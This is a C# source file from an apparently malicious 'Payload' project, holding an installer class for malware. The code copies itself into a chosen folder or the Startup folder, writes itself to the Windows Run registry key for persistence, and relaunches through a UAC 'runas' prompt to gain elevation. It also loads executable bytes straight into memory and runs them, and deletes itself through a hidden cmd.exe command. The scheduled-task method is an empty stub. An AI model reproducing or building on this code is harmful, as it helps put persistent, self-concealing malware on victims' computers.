using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Principal;

namespace Payload.Common
{
    public class clsInstaller
    {
        public string[] m_args { get; set; }

        public bool m_bCopyDir { get; set; }
        public bool m_bStartUp { get; set; }
        public bool m_bReg { get; set; }
        public bool m_bScheduledTask { get; set; }
        public bool m_bUAC { get; set; }
        public bool m_bLoadToMemory { get; set; }

        public string m_szCurrentPath { get; set; }
        public string m_szCopyPath { get; set; }
        public string m_szStartUpName { get; set; }

        public string m_szRegKeyName { get; set; }

        private RegistryKey reg_key;

        public clsInstaller()
        {
            reg_key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        }

        /// <summary>
        /// Start installer.
        /// </summary>
        public void Start()
        {
            Copy();

            if (m_bReg)
            {
                RegRun();
            }



            if (m_bUAC)
                UAC();
        }

        /// <summary>
        /// Copy to specified directory.
        /// </summary>
        private void Copy()
        {
            if (m_bCopyDir)
            {
                if (!File.Exists(m_szCopyPath))
                {
                    File.Copy(m_szCurrentPath, m_szCopyPath, true);
                    new Process()
                    {
                        StartInfo = new ProcessStartInfo()
                        {
                            FileName = m_szCopyPath,
                        }
                    }.Start();

                    Environment.Exit(0);
                }
            }
            if (m_bStartUp)
            {
                if (!File.Exists(m_szStartUpName))
                {
                    File.Copy(m_szCurrentPath, m_szStartUpName, true);
                    Process.Start(m_szStartUpName);

                    Environment.Exit(0);
                }
            }
        }

        /// <summary>
        /// Registry install.
        /// </summary>
        private void RegRun()
        {
            reg_key.SetValue(m_szRegKeyName, m_szCurrentPath);
        }

        public void RegRemove()
        {
            reg_key.DeleteValue(m_szRegKeyName);
        }

        public void fnCreateScheduledTask(string szTaskName, string szAuthor, string szTrigger, string szProgram, string szArgument, string szUser, string szStartTime, string szRemoteServer)
        {

        }

        private bool isAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        /// <summary>
        /// UAC priviledge escalation.
        /// </summary>
        public void UAC()
        {
            if (!isAdmin())
            {
                ProcessStartInfo info = new ProcessStartInfo()
                {
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    UseShellExecute = true,
                    Verb = "runas", //TRIGGER THE UAC PROMPT
                };

                try
                {
                    Process.Start(info);
                }
                catch
                {

                }

                Environment.Exit(0);
            }
        }

        /// <summary>
        /// Memory shell
        /// </summary>
        public void fnLoadToMemory(string[] alpArgs, byte[] abExeBytes)
        {
            Assembly loaded = Assembly.Load(abExeBytes);
            MethodInfo entry = loaded.EntryPoint;
            object instance = null;
            if (!entry.IsStatic)
                instance = loaded.CreateInstance(entry.Name);

            entry.Invoke(instance, new object[] { alpArgs });
        }

        public void fnSelfDestroy(string szPath)
        {
            Process.Start(new ProcessStartInfo()
            {
                Arguments = $"/C choice /C Y /N /D Y /T 5 & Del \"{szPath}\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe",
            });

            Process.GetCurrentProcess().Kill();
        }
    }
}
